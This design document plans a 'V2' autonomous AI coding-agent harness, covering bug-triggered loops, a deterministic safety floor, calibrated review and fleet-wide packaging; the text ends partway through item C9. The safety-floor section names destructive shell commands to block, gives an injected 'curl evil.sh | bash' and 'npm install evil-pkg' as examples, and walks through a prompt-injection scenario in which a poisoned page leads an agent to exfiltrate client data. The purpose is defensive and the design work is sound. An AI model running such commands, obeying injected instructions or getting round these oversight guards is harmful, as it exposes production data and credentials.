# V2 Vision — The Autonomous, Self-Improving, Fleet-Scale Harness (AUTHORITATIVE)

> This is the final vision, authored by the main loop from the synthesizer draft (`VISION-DRAFT.md`) + the
> three pillar lenses + **both adversarial checks folded in** (`VISION-CHECK-overengineering.md`,
> `VISION-CHECK-coherence-feasibility.md`) + Tanner's mid-run design input (the narration channel). Every move
> cites a ground-truth row (§N in `CANONICAL-HARNESS-AS-IS.md`) or a confirmed absence + the re-mine that
> elevates it. No phantom rebuilds (killlist/E TRULY-WORLD-CLASS items left alone); no rejected-pattern
> resurrections (killlist/F upheld items stay dead). **The draft was over-ambitious in priority-tiering, not
> content** — this version keeps the full world-class roster but tiers it honestly: a tiny deterministic floor,
> then a sequenced program. The charter retired *minimalism as a virtue*; it did NOT retire *consolidation as a
> design technique.*

---

## The one-paragraph thesis (teach-test)

V1 built the **harness** — every part an agent needs to do one piece of work: 26 skills, 23 specialist agents,
isolated worktrees, a 9-pass-plus-4-lens reviewer, a deterministic commit/push floor. What V1 never built is
the **loop**: the engine that finds its own work, starts itself, and carries one bug all the way to a reviewed
pull request with no human typing anything — and the **floor** that makes switching that loop on *safe*. Today
a human is the only thing that can start a run, notice there's work to do, or watch while it runs; that makes
the engineer the bottleneck, and no number of parallel agents lifts a ceiling set by one person's attention.
Worse, the harness's deepest asset — its review verdict — dies in a gitignored `.cr-ok` file that never reaches
CI, so the model effectively grades its own homework and a cloud agent can't even read whether review happened.
V2 is five things working together: a **Loop** (a front door that fires on a bug signal, a clock that wakes the
agent laptop-closed, a continuation engine that runs until a *separate grader* says done, and a continuous
narration stream so you always see what the fleet is doing); a **Floor** (deterministic guards below the model's
reach — destructive-command block, credential firewall, retry ceiling, side-effect-skill lockout, and the
keystone: CI re-checking the review verdict on the exact shipped SHA); a **Craft** stack (a reviewer that
attacks from isolated context but full project-canon, can say "no, wrong approach," is measured against a
labeled defect set, verifies behavior via a runnable spec, and pins money-math with invariants the model cannot
weaken); a **Compounding** engine (findings read back into the next run's starting context, recurring findings
ratchet into deterministic blocks, drift detected in both directions on a schedule, and the model-capacity audit
run as a scheduled prune-PR loop); and a **Platform** (the whole thing packaged as a version-pinned plugin +
marketplace with a thin `/init` template, canon migrated from Notion into GitHub, summonable from outside its own
process so it travels as canon across 5+ repos and pulls its own fixes down). **The teach-test version:** *V1 has
all the cells but no engine, no clock, and a forgeable finish line; V2 builds the engine, the small safety floor
that makes the engine safe to start, the quality stack it passes through, the loop that makes it smarter every
cycle, and the distribution that makes it travel — and you can always watch it work.*

---

## The five pillars

**1. THE LOOP — the engine that finds, starts, finishes, and *narrates* its own work.** V1 is a pipeline you
invoke by hand; a loop runs on a clock and a trigger with no human in the firing position — *and keeps telling
you what it's doing.* The front door (GitHub label / Slack-Linear summon / CI self-heal), the clock (cloud
`/schedule`, fires laptop-closed), the continuation engine (`/goal`, run until a *separate* grader confirms a
verifiable end-state), the orchestrator (`/lfg`, chains the cells into a deterministic sequence ending in an
opened PR), and the **narration/legibility channel** (a continuous human-readable status stream + an append-only
agent-PR observability log). Why: the agent is the cheap, interchangeable *middle* — the value lives in the two
*ends*, trigger quality and review contract — and V1 has a world-class middle with no front door and no clock.

**2. THE FLOOR — the small deterministic safety substrate the loop requires before it can switch on.** Advisory
rules hold while a human drives every session; the moment an unattended trigger fires, an advisory rule is a
suggestion and a hardcoded guard is the only real control. The *minimal* floor is five moves (below); the rest of
the floor hardens specific paths and is sequenced, not front-loaded. Why: it is cheap, mostly deterministic (safe
under `disable-model-invocation`), and it is the whole difference between "autonomy is risky" and "autonomy is
bounded."

**3. THE CRAFT — the quality stack the loop passes through, made trustworthy when no human watches.** V1's
reviewer is the deepest in the corpus but invisible, un-independent, un-calibrated, advisory, and write-only — at
exactly the seams the human used to backstop. Make the verdict a queryable GitHub artifact, give the adversarial
reviewer isolated solution-context but full project-canon, add a REJECT tier, calibrate against a labeled defect
set, wire the governance corpus in as criteria, verify behavior via a runnable spec and a CI-resident evidence
bundle, and pin money-math with human-authored invariants. Why: when agents write most of the code, the
bottleneck is no longer writing — it is *checking* — and checking is only as good as its independence,
visibility, and calibration.

**4. THE COMPOUNDING ENGINE — the loop that makes the harness smarter every cycle.** V1 has the *write* side
(RECURRING-FINDINGS auto-counted) but the read-path is open ("never read by implementers"), promotion ends at a
human-read doc, there are no effectiveness metrics, the §9 re-audit never runs, and `/scan-context` is
canon-referenced but absent while canon cites five phantom artifacts. Close the read-path into the implementer's
task-start context, ratchet recurring findings into deterministic blocks, run bidirectional drift detection on a
schedule, track first-pass-approval as a sensor, and run the model-capacity deletion engine as a scheduled
prune-PR loop. Why: a fleet across 5+ repos rots *faster* than a solo repo and re-learns the same lesson every
night unless the loop actually closes.

**5. THE PLATFORM — the packaging that makes the harness travel as canon across the fleet.** Today the harness
lives in one repo plus a drifting Notion shadow; "multi-project" is a goal, not a state. Package the portable
behavior as a version-pinned plugin + marketplace (`/plugin update` = pull), ship a thin `/init` template for the
per-repo files a plugin physically cannot carry, migrate canon from Notion into GitHub (convergence becomes a
`git diff`), govern the third-party skills as a supply-chain boundary, expose the harness as externally-summonable
substrate, and run the context-maintenance loop as a cross-repo cloud routine. Why: the real unit of scale is one
engineer running fleets across 5+ repos, impossible while every other repo starts from zero and an improvement in
one never reaches the others.

> **Why these five, and how the overlaps resolve.** The safety floor spans autonomy and platform → consolidated
> into Pillar 2 because every control is the same *kind* of thing (a deterministic guard below the model's reach).
> The compounding engine spans craft and platform → its own Pillar 4 because "get smarter every cycle" is a
> distinct teachable idea. The keystone CI verdict gate is **owned once** (in THE FLOOR) and referenced — never
> re-built — elsewhere. The teachable cut: **find/start/finish/narrate · keep-safe · check-well · get-smarter ·
> travel.**

---

## THE MINIMAL FLOOR (the correction the proportionality check forced)

The single most important sequencing fact: **the floor L1 (the trigger front door) cannot fire without is small
and nameable.** Everything else is sequenced *after* the first trigger proves the loop. The minimal floor is five
moves:

- **F1** — `block-dangerous-bash.sh` (destructive-command block, fail-closed)
- **F2** — Tier-0 credential firewall as a blocking pre-flight invariant
- **F6** — the unforgeable + visible verdict gate (CI re-verifies the sentinel on the shipped SHA; verdict posted to the PR) — *the keystone*
- **F7** — the bounded-loop contract (hard retry ceiling + REJECT/UNATTENDED handoff)
- **F9** — `disable-model-invocation` on every irreversible side-effect skill

That is the P0 floor. **F5** (MCP trifecta gate) is P0 *only for the Slack/Linear summon path* (it adds an
untrusted-content leg); the GitHub-label trigger doesn't, so F5 is not a blocker for the *first* trigger.
**F3/F4** (egress firewall + migration-credential) are **GATED on Fork F4** (is local-unattended a first-class
surface, or is cloud `/schedule` — already restricted-network — the primary path?). **F8** (fleet circuit
breaker) is P0 *before running fleets at volume*, not before the first single trigger. The build order below
honors this.

---

## The full move roster, organized by pillar

> **Corrected tags:** **P0-floor** = the minimal 5 above · **P0-spine** = the loop the floor is built for ·
> **P1** = ship after the floor + spine · **GATED(Fork-N)** = waits on a named decision/flip-trigger · **CUT** =
> bad fit even at world-class (failure mode named, see Honest Cuts). Consolidations from the adversarial checks
> are marked **[MERGED]** / **[DEMOTED-TO-CLAUSE]** so the audit trail to the draft holds.

### PILLAR 1 — THE LOOP

**L1. The autonomous trigger front-door trifecta (bug signal → reviewed PR).** A bug appears (error monitor
fires, CI goes red, an issue gets a `fix-me` label, someone types `/fix` in Slack) and *that event itself*
summons an agent. **Failure prevented:** the engineer stays the per-repo dispatcher — the exact ceiling autonomy
exists to lift. *Mechanism:* three entry types (GitHub label via Action; Slack/Linear `/fix` summon; CI-failure
self-heal with transient-vs-permanent triage), each routing into the existing worktree shell — **and L1 must name
*which* downstream path each trigger takes: a `fix-me` label or CI-red is often an *incident*, routing into the
`/incident → /hotfix` subsystem (L6), not always `/feature`** (coherence-check T1-3). Side-effecting tail gated by
`disable-model-invocation` (F9); paired with cloud `/schedule` so it fires laptop-closed; ships with the
structural review contract (fixed PR template, test-count floor, blast-radius classifier). **Named safety
companions:** F1, F2, F6, F7, F9 (the minimal floor) + F5 *for the Slack/CI free-text triggers only*. **Ordering
carve-out (coherence-check T2-2):** the **GitHub-label trigger ships first** — it carries no attacker-controllable
free-text, so it is safe before F3 (egress) lands; the Slack/Linear summon and CI-self-heal (which ingest
attacker-controllable issue text — the canonical injection surface) wait for F3 + F8. *Citation:* confirmed
absence — §3e (only triggers on disk fire on human actions). Elevated by `bug-to-pr-automation.md`,
`stripe-minions-kaliski.md`, scale-bias #1/#2/#3/#4 (the #1 wrongly-suppressed idea). *Tag:* **P0-spine —
label-trigger first, on the minimal floor.**

**L2. `/goal` — the per-task continuation primitive.** A session stops and waits for a human "continue" after
every turn; `/goal` self-continues until a *fresh, separate* grader confirms a verifiable end-state. **Failure
prevented:** babysitting a session with a clean finish line; and versus "loop forever," the working agent
rationalizing its own success. *Mechanism:* `/goal` drives one well-specified reversible task; the stopping
condition bottoms out on real verifiers (MUST-FIX=0, CI green on SHA, diff under cap) plus a turn/time bound —
never a prose claim. **Embeds the verifier-rung doctrine [DEMOTED-TO-CLAUSE, was L3]:** four ways an agent
decides "done," ranked by distance from ground truth — (1) its own confidence; (2) a fresh model reading only the
transcript; (3) a fresh-context reviewer reading the diff and running tools (`/cr`); (4) a CI required-check on a
sentinel'd SHA. Standing rule: any signal that decides whether work *ships* must bottom out at rung 3-4; rungs
1-2 may control *continuation*, never *certification* (prevents trust-laundering). **Capability precondition
(coherence-check T1-2):** `/goal`'s "run until graded" loop assumes a Stop hook's `decision:block` *force-continues*
the model — `capability-facts.md` marks this "verify empirically." **Phase-0 probe required**, with a named
fallback (external re-invocation via the L1 front door / cloud `/schedule`) if force-continue doesn't hold.
*Citation:* confirmed absence — `/goal` registered nowhere on disk. Elevated by `goal-loop-primitive.md`,
`loop-engineering.md`. *Tag:* **P0-spine — co-sequenced with F6 + F7** (it is the forcing function that makes them
mandatory).

**L4. The cloud heartbeat — scheduled self-triggering discovery.** Every mechanism fires only when a human starts
a session; a loop runs on a clock and surfaces work *we didn't already know about*. **Failure prevented:** the
silent death of every "weekly" ritual (no scheduler → a weekly ritual runs twice then never again). *Mechanism:*
cloud `/schedule` + `CronCreate` fire a recurring discovery agent (ritual scans, runtime-error surface,
≥3-recurring findings) feeding a *gated action agent* (bug→PR, not a file a human reads on an unscheduled
morning); respect the R1 constraint (+98% PRs, zero DORA gain) by producing one scoped, pre-validated PR per
finding, never 30 raw triage items. *Citation:* confirmed absence — §3e (rituals trigger only at session start;
no cron); scheduling substrate confirmed present. Elevated by `loop-engineering.md`, scale-bias #8/#9. *Tag:*
**P0-spine substrate.**

**L5. The `/lfg` orchestrator — brainstorm→plan→work→review→compound→opened-PR.** We own every *cell* of the
idea-to-PR loop but no committed command closes them into a deterministic sequence ending in an opened PR.
**Failure prevented:** the "AFK is a someday-feature" trap — the loop never closes and every task still needs a
babysitter at each handoff. *Mechanism:* a single orchestrator sequencing the existing pieces with no human
between steps, ending by calling `scripts/pr.sh`, inside UNATTENDED worktree mode behind the Tier-0 firewall (F2),
side-effect tail gated by F9; deterministic seams / agentic cells; the structural brainstorm→plan seam (diverge
then converge) + a routing flag on `/cr` findings (needs-design-decision vs must-fix-now). **Honest costing
(proportionality-check MF-4):** the "seven-failure-mode guard battery" is **1 orchestrator + 7 distinct guards**,
not one clause — skill-cache/restart rule, encoding-normalization, agent-stall watchdog, context-drift /
non-determinism / compound-timing checks, **and the cross-skill reference-integrity CI check, which is pulled out
as its own move (CMP4-adjacent) because it is a precondition** (we already carry phantom refs). **Prerequisite:**
resolve the `/dev`-vs-`/feature` canonical-driver fork (Fork F8) before building, so the orchestrator doesn't bake
in a duplication. *Citation:* confirmed absence — §3b (cells exist, no chaining orchestrator); §6 (phantom refs).
Elevated by `every-compound-lfg.md` (single biggest move), scale-bias #20. *Tag:* **P0-spine — the keystone
integration deliverable; ships after the minimal floor + L2/L4.**

**L6. Preserve the incident→hotfix→migrate→post-mortem subsystem and its cross-skill triage-doc-travel protocol.**
*(NEW — added per coherence-check T1-3, the #1 carry-forward alert the draft dropped.)* `incident`, `hotfix`,
`migrate`, `post-mortem` are not four disconnected skills — they are **one routed state machine**: the
`.claude/incident-[slug].md` triage doc literally *travels to the receiving skill and replaces its orient step*
(`incident/SKILL.md:269-287`); the incident-responder runs an 8-type routing brain; a security signal triggers an
**isolation-only short-circuit** (never auto-fix); `@hotfix-guard` gates on the exact `[~]` TASKS.md entry shapes
`/hotfix` writes. **Failure prevented:** flattening the production-incident path into `/feature` loses the routed
subsystem — and the prod-incident path ("prod is down" → `/incident` → route → `/hotfix` → guard → PR) is *exactly*
the canonical bug→reviewed-PR loop the charter centers on. *Mechanism:* carry the doc-travel-as-orient-replacement
protocol, the routing brain, the security short-circuit, and the guard's exact entry shapes forward verbatim into
the plugin; wire L1's incident-class triggers into it. *Citation:* grounding `skills-B` alert #1, `agents-A` alert
#6. *Tag:* **P0 carry-forward — do-not-drop; wired into L1's routing.**

**L7. The narration / legibility channel — continuous run-status + the agent-PR observability log.** *(Tanner
design input, 2026-06-11: "tell me what's going on even if you're still driving — add that to V2.")* **Failure
prevented:** an autonomous run that only reports at the end leaves the operator blind during the run — a
confidently-wrong long run isn't visible until it's expensive to unwind; the operator can't course-correct and
can't safely let the fleet run unattended without it. *Mechanism:* (a) a **continuous narration stream** — every
long autonomous primitive (`/goal`, `/lfg`, the trigger front-door, cloud routines) emits a short human-readable
status after each milestone (just-finished / running-now / next / waiting-on) to wherever the human watches
(terminal, the human-paging surface of Fork F9); (b) the **agent-PR observability log** — promote
`permission-logger.sh` into an append-only forensic feed of every autonomous action (trigger fired, PR opened +
link, risk tier, auto-approved-vs-escalated, outcome). The log is the prerequisite for safe auto-approval
(LOOP-7); the narration is the prerequisite for trusting the fleet at all. Dogfooded in this very session (these
check-ins are the feature). *Citation:* confirmed absence — no narration/notification sink in §3e–§3f;
`permission-logger.sh` logs permission calls, not run progress or PR outcomes. Elevated by `bug-to-pr-automation.md`
(Slack-channel-as-agent-PR-log), `shopify-ai-first.md` (session-end review artifact), scale-bias #6. *Tag:*
**P0-spine — co-ships with L1/L4** (a fleet across 5+ repos is illegible without it).

**LOOP-7 / A6. Deterministic risk-based auto-approval (Ona L4) — take most PRs out of the human path.** Classify
LOW/MEDIUM/HIGH off paths + diff-size + test-delta + scope; LOW auto-*approves* into the F6 CI floor (auto-approve
≠ auto-merge — the agent is never the last gate), MEDIUM → `/cr`, HIGH → `/cr-security` + human. **Failure
prevented:** the human-review-capacity bottleneck no number of parallel agents can lift. *Mechanism:* a
non-LLM classifier (the merge decision carries no model judgment, so it's safe under F9). **Named safety
companions:** F6 (the deterministic last gate beneath it), C4 (recall measured + above a floor), CMP3 (the
per-task-type signal), L7 (the observability log). *Citation:* §3c. Elevated by `code-review-latentspace.md` Move
1 (independent 74% lead-time proof), scale-bias #5. *Tag:* **GATED(Fork F2) → P1.** Ships in **observe-only** mode
(classify + log, human merges) until C4's recall clears a floor — then live LOW-auto per Fork F2.

### PILLAR 2 — THE FLOOR

**F0. Isolation-by-construction — give each job a disposable environment, so most locks become optional.**
*(ADDED from the Ranger "overthinking background agents" 3-pass + Tanner's direction "that should be part of V2.")*
**Failure prevented:** we spend the whole floor *guarding* a production blast radius we chose to leave in the box
(`.env.local` points at PROD Supabase) — when the cheaper move is to *remove* the blast radius. *Mechanism:* each
unattended job runs against a **disposable per-job database branch** (no real data, auto-expiring — Supabase
branching, the positive version of F2's "refuse if prod keys present"), **no production credentials, no external
IP**, and a **side-effect outbox** (in unattended mode every real side-effect — Slack/email/deploy/external write —
is captured to a list a human reviews, not performed; complements F9's `disable-model-invocation` with "even if one
fires, it's captured not performed"). **Consequence:** once the agent has no prod blast radius, **F2 / F3 / F5
demote from load-bearing to belt-and-suspenders** — remove the danger instead of guarding it. *Bounded check:* is
Supabase branching fast enough for a per-job disposable DB (Ranger uses Neon)? *Citation:* `passes/ranger-
background-agents/pass3-apply.md`; map §3e (`.env.local`→prod). *Tag:* **P0 — the cheapest, highest-leverage safety
lever; reframes the rest of the floor.**

**F1. `block-dangerous-bash.sh` — the destructive-operation guard (canon's absent 3rd guard).** A deterministic
guard blocking irreversible shell actions (prod deploys, `rm -rf` outside the worktree, `DROP`/`TRUNCATE`/
`DELETE`-without-`WHERE`, destructive `supabase db push`, writes to `.git`/`.husky`/`.claude`) *before they run*.
**Failure prevented:** the literal Replit-July-2025 prod-DB deletion and PocketOS-2026 — an unattended agent
mid-cascade with no human to stop it. *Mechanism:* a `PreToolUse` Bash hook alongside the existing two, full
scope, **fails closed** on a missing dependency ("a guard that fails open is probabilistic enforcement in a
costume"); includes the F4 `supabase db push`-non-local block as the *enforcement* of F4's decision. *Citation:*
confirmed absence — §3e/§5. Elevated by `bug-to-pr-automation.md`, `agent-sandboxing-10co.md` Move 2, killlist E
#2 / F #4. *Tag:* **P0-floor.**

**F2. Tier-0 credential firewall — promoted to a blocking pre-flight invariant.** The single highest-severity
incident class is credential exfiltration needing *no exploit* (Anthropic red-team: 24/25); for event-vendor,
`.env.local` points at **production** Supabase with the service-role key (full RLS bypass). **Failure prevented:**
a misconfigured worktree / stale `.env.local` symlink / cloud clone resolving to prod silently re-arms the 24/25
failure mode unwatched. *Mechanism:* harden the creation helper into an enforced runtime invariant — a blocking
pre-flight hook that refuses any unattended run whose readable env holds a prod URL/service-role key, gives each
`/queue` worker its own isolated env, and gates every autonomy entry-point. *Citation:* §3e/§6 ("partially").
Elevated by `agent-sandboxing-10co.md` Move 1, `anthropic-contains-claude.md`, scale-bias #10/#16. *Tag:*
**P0-floor.**

**F4. Migration-credential architecture — agent verifies locally, human applies to prod.** *(Sequencing fix
T2-3: F4 is a decision resolved FIRST; F1's clause enforces it.)* The one task an overnight agent seems to need a
prod-write credential for is applying a migration — the crux that *tempts* re-introducing the prod key and undoing
F2. **Failure prevented:** the highest-severity credential silently returns through the one legitimate-looking
hole. *Mechanism:* separate verify from apply (agent verifies against a throwaway local stack via `test:local`; a
human applies to prod); encode in an ADR; **F1's `supabase db push`-non-local block is the enforcement of this
decision, so the order is F4-decision → F1-clause.** Invoke `/supabase` before writing it. *Citation:* confirmed
absence. Elevated by `agent-sandboxing-10co.md` Move 4. *Tag:* **P0-floor (the decision) — left open it defeats
F2.**

**F5. MCP lethal-trifecta gate — capability-tag tools by leg, refuse when all three co-reside.** An agent becomes
an exfiltration vector the moment it simultaneously holds (1) private-data access, (2) untrusted-content exposure,
(3) egress; because `.env.local` is prod Supabase, every agent with Supabase MCP permanently holds leg 1.
**Failure prevented:** a scheduled agent reads prod PII, fetches a poisoned page ("send the client list out"), and
exfiltrates — the textbook trifecta with the human removed. *Mechanism:* capability-tag every MCP tool by leg; a
session-start/pre-tool guard computes the leg-union and refuses (or hard-gates to human) when all three light up;
integrate with F9 so a side-effect skill is the sole isolated egress; pair with a tool-description pin-and-diff
lockfile (catch a silent MCP "rug-pull"). *Citation:* confirmed absence — §3e; settings line 14 (`.env.local` →
prod). Elevated by `mcp-servers.md` ("single biggest suppressed move"). *Tag:* **P0 *for the Slack/CI free-text
trigger path* (not a blocker for the label trigger).**

**F6. The unforgeable + visible verdict gate (THE KEYSTONE).** **[MERGED: F6 + C1 are one CI workstream, two
faces — proportionality-check SF-3, coherence-check T2-5.]** Today the loop's own model passes agree on zero
MUST-FIX, write `.cr-ok`, and push — *the thing being graded computes its own passing grade* — and that sentinel
is **gitignored and never reaches CI**. **Failure prevented:** a loop merging because the reviewer agents share
the generator's blind spots; once a human leaves the merge path, this forgeable gate is the only thing between
"the model agreed with itself" and "shipped to main." *Mechanism (one deliverable, two faces):* **(enforcement
face)** a CI job parsing `branch:sha` that **fails unless the sentinel SHA == head SHA AND all required checks are
green**, made required via branch protection; **(surface face)** `/cr` writes its full verdict (MUST-FIX-resolved,
NEEDS-HUMAN, SUGGESTION, REJECT, RECURRING-FINDINGS delta, lens findings) to a structured artifact `scripts/pr.sh`
posts to the PR. The `.cr-ok` sentinel survives as the *readiness* signal; the CI gate is the *enforceable
boundary*. Rename the doctrine "cross-MODEL" → "cross-AUTHORITY." **F6 owns the boundary; C1/C7/LOOP-7 are
consumers of this one gate, not parallel implementations.** *Citation:* §3f lines 229–231 (Node 8.5(c)). Elevated
by `recursive-self-improvement.md` Move 1, `coderabbit.md` Move 1, killlist E #1/#2. *Tag:* **P0-floor — the
keystone; hard prerequisite for any unattended push. Verdict-artifact surface = Fork F1.**

**F7. Bounded-loop contract — a hard retry ceiling + defined REJECT/UNATTENDED handoff on every loop.** **[MERGED:
C3 folds in here as "F7 surfaced inside `/cr`" — SF-2.]** LLM retries hit diminishing returns and start producing
"creative but wrong fixes harder to review than the original problem." **Failure prevented:** an unattended agent
spins indefinitely, or stops half-done with no one paged; and the overnight run that ships five polished all-green
PRs solving the *wrong problem* straight to a tired human. *Mechanism:* a cross-cutting `bounded-loop` contract
every primitive inherits — a `MAX_ITERATION` constant (default 2–3, tunable) + a first-class terminal
`REJECT`/`NEEDS-HUMAN` state with a defined artifact and paging target; wired into `/cr`'s auto-fix loop, `/debug`,
`/refactor`, `/goal`, cloud `/schedule`. **REJECT (surfaced inside `/cr`)** auto-closes and re-queues with a
reason (does NOT escalate); deterministic triggers (scope explosion; diff over ~800 lines; CI failing with no
auto-fix path; auth/schema/payment change with zero/negative test delta; diff solves a different problem than the
spec); REJECT→re-spec→REJECT twice escalates to the human-paging surface. *Citation:* §3c ("No REJECT tier, no
UNATTENDED branching"). Elevated by `agentic-platform-eng-saul.md` Move 1, `code-review-latentspace.md`,
`stripe-minions-kaliski.md`. *Tag:* **P0-floor. The *number* is a tuning call (Fork F2-adjacent).**

**F8. Stop-the-line defect-class circuit breaker — halt the fleet when the same failure repeats.** A retry ceiling
bounds *one* loop; stop-the-line bounds the *fleet*. **Failure prevented:** an unattended fleet stacks 20 PRs on a
single broken assumption across 5 repos before anyone looks — "the fleet doesn't fail once, it fails twenty
times." *Mechanism:* a defect-class halt in the unattended/`/loop`/`/queue`/`/schedule` path — on N repeats of a
normalized failure signature, write a stop-the-line marker, stop opening new PRs in that class, page a human; pair
with the learned-constraint ratchet (CMP2) so the root-cause becomes an enforced row. *Citation:* §3c/§3f.
Elevated by `osmani-agent-skills.md` Move 3. *Tag:* **P0 before running fleets at volume** (a hair after the first
single trigger).

**F9. `disable-model-invocation` across irreversible side-effect skills + the activation-tier audit.**
`disable-model-invocation:true` removes a skill from the model's context, making it a safe actuator only a pinned
orchestrator step can summon; today **0 of 26 skills** carry any invocation-control frontmatter. **Failure
prevented:** an autonomous loop invokes deploy / open-PR / migration-apply on model judgment. *Mechanism:* assign
every skill an activation tier; irreversible side-effect skills (open-PR, deploy, send-Slack, migration-apply,
`queue`, `setup-strategy` which mutates CLAUDE.md, the `/init` materializer) get `disable-model-invocation:true`;
rewrite phrase-keyed descriptions to situational triggers. *Note:* a `deny` in *committed* settings.json is
agent-reachable; the truly unbypassable floor is `managed-settings.json`, but *placing* it is a human handoff (no
agent edits to guard files — Fork F5). *Citation:* §3e (0/26). Elevated by killlist E #11, `commands-vs-skills.md`
Move 1/2. *Tag:* **P0-floor — the substrate that makes side-effect skills safe.**

**F3. Egress allowlist — the only defense for the prompt-injection supply-chain class.** The credential firewall
defeats *exfiltration of a key in the box*; it does nothing against an injected `npm install evil-pkg` or `curl
evil.sh | bash` (code-compromise, not key leak). **Failure prevented:** the Cline-Feb-2026 supply-chain vector on
an unattended `npm install`-to-reproduce loop. *Mechanism:* a network egress allowlist (GitHub, Supabase, npm,
Anthropic; deny rest) for *local* unattended `/queue` runs; plus an operation-level view (a destination is not an
operation — the deny-by-default profile blocks `gh api` mutations, arbitrary `WebFetch`, `apply_migration` unless
a task manifest grants them, the *hook* reading the manifest). *Citation:* confirmed absence — §3e (92-entry allow
list carries `Bash(gh api *)`, `WebFetch(*)` with no op-level gate). Elevated by `agent-sandboxing-10co.md` Move
3, `anthropic-contains-claude.md`, scale-bias #16. *Tag:* **GATED(Fork F4) → P0/P1** — Fork F4 decides if
local-unattended is first-class; if cloud `/schedule` (already restricted-network) is primary, F3 is secondary
hardening. Bounded check: Seatbelt-egress-allowlist vs `pfctl`/Privoxy.

### PILLAR 3 — THE CRAFT

**C2. True adversarial independence — fresh sub-agent, isolated solution context, shared project canon, iterative
loop.** The strongest *quantified* mechanism in the corpus — Gemini CLI #26397 lifted merge-readiness 43%→91% via
cross-context adversarial iteration before any human looked; our 4 lenses run inside the same `/cr` invocation
sharing the coder's context. **Failure prevented:** the reviewer inherits the coder's rationalizations and
polishes a confidently-wrong solution; *and* the opposite — a canon-blind reviewer re-litigating settled decisions
and missing tenant/RLS rules in `src/data/`. *Mechanism:* provision the adversarial pass with a clean solution
context (no coding-session reasoning) but WITH read access to project canon (CLAUDE.md, AGENTS.md, Rejected
Patterns, PITFALLS, ADRs); framing inverted to "find what breaks this"; run as a 3-4 round hunt→fix→retest loop
bounded by an iteration cap. **Carry-forward the 4-lens contract verbatim (coherence-check T2-4):** `@reviewer`
*pre-reads CONTEXT/AGENTS/PITFALLS and passes them into each lens* (lenses don't re-read); each lens attacks
exactly one failure class; the **stay-in-lane rule** keeps lenses non-overlapping. *Citation:* §3c/§3d. Elevated
by `code-review-latentspace.md` Move 2; killlist F #5. *Tag:* **P0-spine quality (wire with C5).** The largest
evidenced pre-human quality jump.

**C4. Calibrate the reviewer — golden-set recall, re-run on every model/pass change.** Nobody has measured whether
`/cr` catches 1-in-5 defects or 4-in-5, and we just swapped Sonnet 4.6 → Opus 4.8 blind. **Failure prevented:**
shipping autonomy on a quality gate with an unknown, possibly catastrophic miss rate. *Mechanism:* a `golden-set/`
corpus of **adversarially-seeded** labeled diffs (missing fallback, `as`-without-narrowing, cross-tenant RLS hole,
open-redirect) + clean diffs; a `/cr-calibrate` CI job emits recall + false-positive-rate per pass/lens; re-run on
any change to `/cr` passes, the tier-merge rule, or the model; a stale recall blocks promotion of `/cr` as a
trusted gate; cap `/queue`/`/schedule` self-merge until recall clears a stated floor. *Doctrine:* a calibrated
`/cr` is a *triage* layer, never a *terminal* authority (terminal authority is F6). *Citation:* confirmed absence
— §6 (`@benchmark-runner` phantom). Elevated by `coderabbit.md` Move 2, `recursive-self-improvement.md` Move 2,
`when-is-llm-call-worth-it.md`. *Tag:* **P1 — the hard gate on unattended self-merge** (runs against a curated
corpus → promotes now, unlike outcome tracking).

**C5. Wire the governance corpus (ADRs, Rejected Patterns, PITFALLS, golden exemplars) into review as criteria.**
CodeRabbit's structural blind spot is *memory locality* — it cannot reason over historical design decisions and
locked conventions; that is exactly our moat, unused. **Failure prevented:** a reviewer that re-litigates settled
decisions or silently lets a PR violate a locked ADR / an RLS role-check (explicitly rejected) / a known PITFALL /
a golden-exemplar divergence. *Mechanism:* a dedicated `/cr` lens whose input is `docs/adr/` + AGENTS.md Rejected
Patterns + PITFALLS + **the golden-exemplars table** (the `lens-composition` "golden-exemplar-divergence =
Must-Fix" mechanism carried forward verbatim, coherence-check T3-4), instructed to flag any hunk contradicting a
locked decision and cite the specific ADR/pattern. **Ownership (proportionality-check SF-5):** C5 *bootstraps* the
initial governance lens from the existing corpus; CMP2 is the *ratchet that adds new criteria* when a finding
crosses ≥3. *Citation:* §5, §4; confirmed absence. Elevated by `coderabbit.md` Move 3. *Tag:* **P1 — the
highest-defensibility move** (converts "a local CodeRabbit" into "a reviewer no SaaS tool can replicate"). Wire
alongside C2.

**C6. The per-feature behavioral contract — `docs/specs/<feature>.md` with an executable Verification section.**
Repos hold *code* (how) and *project-context docs* (what this codebase is) but rarely the third thing: "what is
THIS feature supposed to do, and how do I know it still does it?" CLAUDE.md *names* `docs/specs/` but it does not
exist on disk. **Failure prevented:** behavioral drift — the fifth modification six months later by a stateless
cold-start agent silently breaks behavior nobody re-stated. *Mechanism:* a per-feature doc with Behavior /
Implementation-pointers / Verification (executable steps); wire `/feature` to write/update the spec first; ship
with an independent review pass on the spec (spec-first has no built-in adversary — do NOT copy
self-verification-by-implementer); do NOT absorb into ADRs or developer tests. **C7 folds in here
[DEMOTED-TO-CLAUSE]:** the autonomy gate verifies the spec's Verification section pass, not the `.cr-ok`
*process-completion* token (this is a *configuration of F6 + C6*, not a third gate — proportionality-check MF-5).
*Citation:* confirmed absence — §3a, §4; §9 pre-authorizes re-typing `.cr-ok` to a readiness signal. Elevated by
`notion-spec-driven.md` Moves 1/2, killlist C #6. *Tag:* **P1 enabling substrate; designed in lockstep with F6.**

**C8. The `/verify` render gate — artifact-producing, CI-resident, fail-closed tenant assertion.** When an agent
says "I fixed the layout, it renders correctly," a human takes it on faith. **Failure prevented:** an overnight
agent merges a UI-broken PR; and the multi-tenant trap — a snapshot taken authed as the *wrong tenant* renders
perfectly (RLS isolation is invisible to the DOM) and yields a confident-wrong "looks fine," a security-incident
generator. *Mechanism:* a project-owned `/verify` skill (distinct from `/debug` — binary deterministic gate vs
capped exploratory hunt); against a preview deploy, capture an a11y snapshot + console errors + pixel-diff vs a
checked-in baseline, attach the bundle to the PR, F9-gated; **a fail-closed tenant assertion before any snapshot
is trusted**; because chrome-devtools-mcp is headed-only, the **unattended verify leg runs as a CI job against a
preview deploy (headless)**, keeping chrome-devtools-mcp for *attended* debugging. *Citation:* §3c/§3f; killlist E
#10. Elevated by `playwright-mcp-debug.md` Moves 1/4/5, `vercel-agentic-infra.md`, killlist C #7. *Tag:* **P1 — UI-fix
mergeability.** Pairs with C9.

**C9. Agent-legible == human-accessible markup, mandated + lint-enforced.** Whether an agent can navigate and
diagnose the app is decided by markup, not tooling; the markup that makes the app *agent-legible* is the exact
markup that makes it *accessible to humans* (WCAG). **Failure prevented:** every browser-verification run produces
noisy guess-laden snapshots the agent misreads (grep finds **zero** `data-testid` across `src/`/`app/`).
